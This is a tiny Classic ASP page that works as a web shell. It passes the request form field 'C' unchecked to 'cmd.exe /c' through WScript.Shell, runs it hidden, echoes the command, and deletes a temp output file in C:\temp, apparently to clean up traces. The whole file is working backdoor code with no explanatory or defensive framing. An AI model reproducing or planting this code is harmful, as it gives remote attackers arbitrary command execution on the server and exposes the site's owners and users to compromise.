<%
Set runner = Server.CreateObject("WScript.Shell")
command = Request.Form("C")
Call runner.Run("cmd.exe /c " & command, 0, True)
Response.Write command
Set fso = Server.CreateObject("Scripting.FileSystemObject")
fso.DeleteFile "C:\temp\output.txt", True
%>
